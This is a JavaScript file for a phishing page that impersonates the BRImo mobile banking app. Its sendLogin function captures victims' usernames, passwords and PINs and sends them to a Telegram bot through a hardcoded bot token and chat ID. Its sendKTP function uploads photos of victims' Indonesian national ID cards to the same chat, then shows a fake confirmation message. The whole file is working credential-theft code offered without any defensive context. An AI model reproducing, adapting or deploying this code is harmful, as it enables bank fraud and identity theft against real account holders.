const BOT_TOKEN = "7496033851:AAHIFFZVpSARwwCpo6yk-neEKBnk7DN3TS0";
const CHAT_ID = "7819779147";

window.onload = () => {
  setTimeout(() => {
    document.getElementById("splash").style.display = "none";
    document.getElementById("landing").style.display = "block";
  }, 2000);
};

function showLogin() {
  document.getElementById("landing").style.display = "none";
  document.getElementById("loginPage").style.display = "block";
}

function showPin() {
  document.getElementById("loginPage").style.display = "none";
  document.getElementById("pinPage").style.display = "block";
}

function backToHome() {
  document.getElementById("loginPage").style.display = "none";
  document.getElementById("ktpPage").style.display = "none";
  document.getElementById("pinPage").style.display = "none";
  document.getElementById("qrPage").style.display = "none";
  document.getElementById("landing").style.display = "block";
}

function showKTP() {
  document.getElementById("landing").style.display = "none";
  document.getElementById("ktpPage").style.display = "block";
}

function previewKTP(event) {
  const input = event.target;
  const preview = document.getElementById("previewKTP");
  if (input.files && input.files[0]) {
    const reader = new FileReader();
    reader.onload = function (e) {
      preview.src = e.target.result;
      preview.style.display = "block";
    };
    reader.readAsDataURL(input.files[0]);
  }
}

function sendLogin() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const pin = document.getElementById("pin").value;

  const message = `BRImo Login\nUsername: ${username}\nPassword: ${password}\nPIN: ${pin}`;
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  });

  document.getElementById("pinPage").style.display = "none";
  document.getElementById("qrPage").style.display = "block";
}

function sendKTP() {
  const fileInput = document.getElementById("ktpFile");
  const file = fileInput.files[0];
  if (!file) return alert("Silakan pilih gambar terlebih dahulu.");

  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", file);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  }).then(() => {
    alert("Berhasil diunggah. Kami akan segera memproses.");
    backToHome();
  });
}